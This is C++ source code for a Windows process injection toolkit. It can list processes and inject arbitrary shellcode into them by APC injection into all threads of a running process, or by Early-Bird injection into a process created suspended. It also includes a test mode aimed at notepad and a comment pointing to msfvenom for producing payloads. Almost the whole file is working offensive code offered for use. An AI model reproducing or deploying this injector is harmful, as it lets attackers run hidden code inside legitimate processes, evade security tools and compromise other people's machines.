// injector.cpp — process injection toolkit
// Compile: g++ -std=c++17 -o injector.exe injector.cpp -lws2_32
// Usage: injector.exe list | apc <pid> <shellcode_hex> | early-bird <exe_path> <shellcode_hex> | test

#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string>
#include <vector>

// ─── Utilities ────────────────────────────────────────────────────────────────

static std::vector<uint8_t> hex_decode(const char* hex) {
    std::vector<uint8_t> out;
    size_t len = strlen(hex);
    for (size_t i = 0; i + 1 < len; i += 2) {
        char buf[3] = {hex[i], hex[i+1], 0};
        out.push_back((uint8_t)strtoul(buf, nullptr, 16));
    }
    return out;
}

// ─── list: enumerate processes ────────────────────────────────────────────────

static void cmd_list() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) { fprintf(stderr, "Snapshot failed\n"); return; }
    PROCESSENTRY32 pe{ sizeof(pe) };
    printf("%-8s  %s\n", "PID", "Name");
    printf("%-8s  %s\n", "---", "----");
    if (Process32First(snap, &pe)) {
        do {
            printf("%-8lu  %s\n", pe.th32ProcessID, pe.szExeFile);
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
}

// ─── apc: APC shellcode injection into existing process ──────────────────────

static void cmd_apc(DWORD pid, const std::vector<uint8_t>& sc) {
    printf("[*] APC injection -> PID %lu (%zu bytes)\n", pid, sc.size());

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { fprintf(stderr, "[!] OpenProcess failed: %lu\n", GetLastError()); return; }

    // Allocate RW, write, then flip to RX
    LPVOID mem = VirtualAllocEx(hProc, nullptr, sc.size(),
                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { fprintf(stderr, "[!] VirtualAllocEx failed: %lu\n", GetLastError()); CloseHandle(hProc); return; }
    printf("[+] Allocated at 0x%p\n", mem);

    SIZE_T written = 0;
    WriteProcessMemory(hProc, mem, sc.data(), sc.size(), &written);
    printf("[+] Wrote %zu bytes\n", written);

    DWORD old = 0;
    VirtualProtectEx(hProc, mem, sc.size(), PAGE_EXECUTE_READ, &old);
    printf("[+] Flipped to RX\n");

    // Queue APC to all threads
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te{ sizeof(te) };
    int queued = 0;
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID != pid) continue;
            HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
            if (!hThread) continue;
            if (QueueUserAPC((PAPCFUNC)(ULONG_PTR)mem, hThread, 0)) ++queued;
            CloseHandle(hThread);
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    printf("[+] Queued APC to %d thread(s)\n", queued);
    CloseHandle(hProc);
    printf("[*] Shellcode will run when a thread enters alertable wait\n");
}

// ─── early-bird: create suspended process, inject before EP runs ─────────────

static void cmd_early_bird(const char* exe_path, const std::vector<uint8_t>& sc) {
    printf("[*] Early-Bird -> %s (%zu bytes)\n", exe_path, sc.size());

    STARTUPINFOA si{ sizeof(si) };
    PROCESS_INFORMATION pi{};
    if (!CreateProcessA(nullptr, (LPSTR)exe_path, nullptr, nullptr, FALSE,
                        CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
        fprintf(stderr, "[!] CreateProcess failed: %lu\n", GetLastError());
        return;
    }
    printf("[+] Created suspended PID=%lu TID=%lu\n", pi.dwProcessId, pi.dwThreadId);

    LPVOID mem = VirtualAllocEx(pi.hProcess, nullptr, sc.size(),
                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) {
        fprintf(stderr, "[!] VirtualAllocEx failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return;
    }

    SIZE_T written = 0;
    WriteProcessMemory(pi.hProcess, mem, sc.data(), sc.size(), &written);

    DWORD old = 0;
    VirtualProtectEx(pi.hProcess, mem, sc.size(), PAGE_EXECUTE_READ, &old);
    printf("[+] Written & RX at 0x%p\n", mem);

    if (!QueueUserAPC((PAPCFUNC)(ULONG_PTR)mem, pi.hThread, 0)) {
        fprintf(stderr, "[!] QueueUserAPC failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
    } else {
        printf("[+] APC queued; resuming thread\n");
        ResumeThread(pi.hThread);
        printf("[+] Thread resumed; shellcode executes before EP\n");
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

// ─── test: inject a benign x64 shellcode (ExitThread) into notepad ───────────

static void cmd_test() {
    // x64: push rbp; xor ecx,ecx; sub rsp,28h; call ExitThread
    // For a real test use: msfvenom -p windows/x64/exec CMD=calc.exe -f hex
    // This is a safe NOP sled + ret (no-op stub for lab testing)
    uint8_t nop_stub[] = {
        0x90,0x90,0x90,0x90,  // nop sled
        0x48,0x31,0xC9,        // xor rcx, rcx
        0x48,0x83,0xEC,0x28,   // sub rsp, 0x28
        // call ExitThread via import — needs a real target to be useful
        0xC3                   // ret
    };
    printf("[*] Test mode: injecting safe NOP+ret stub into notepad.exe\n");
    printf("[!] Spawn notepad.exe first, then this will APC-inject a no-op stub.\n");

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe{ sizeof(pe) };
    DWORD pid = 0;
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "notepad.exe") == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);

    if (!pid) { printf("[!] notepad.exe not found — start it first\n"); return; }
    printf("[*] Found notepad.exe PID=%lu\n", pid);

    std::vector<uint8_t> sc(nop_stub, nop_stub + sizeof(nop_stub));
    cmd_apc(pid, sc);
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage:\n"
               "  injector.exe list\n"
               "  injector.exe apc <pid> <shellcode_hex>\n"
               "  injector.exe early-bird <exe_path> <shellcode_hex>\n"
               "  injector.exe test\n");
        return 1;
    }
    std::string cmd(argv[1]);
    if (cmd == "list") {
        cmd_list();
    } else if (cmd == "apc" && argc >= 4) {
        DWORD pid = (DWORD)strtoul(argv[2], nullptr, 10);
        auto sc = hex_decode(argv[3]);
        if (sc.empty()) { fprintf(stderr, "Invalid shellcode hex\n"); return 1; }
        cmd_apc(pid, sc);
    } else if (cmd == "early-bird" && argc >= 4) {
        auto sc = hex_decode(argv[3]);
        if (sc.empty()) { fprintf(stderr, "Invalid shellcode hex\n"); return 1; }
        cmd_early_bird(argv[2], sc);
    } else if (cmd == "test") {
        cmd_test();
    } else {
        fprintf(stderr, "Unknown command or missing args.\n");
        return 1;
    }
    return 0;
}
